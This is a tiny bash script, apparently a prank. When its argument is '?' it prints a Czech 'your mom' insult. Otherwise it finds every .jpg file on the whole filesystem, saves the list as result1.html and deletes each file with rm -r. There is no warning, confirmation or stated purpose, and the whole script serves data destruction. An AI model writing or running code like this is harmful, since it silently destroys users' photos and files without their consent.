if [[ $1 = "?" ]]
then 

echo "Tvoje máma"

else
find / -type f -name '*.jpg' > result1.html

for i in $(<result1.html)
do
rm -r $i

done

fi

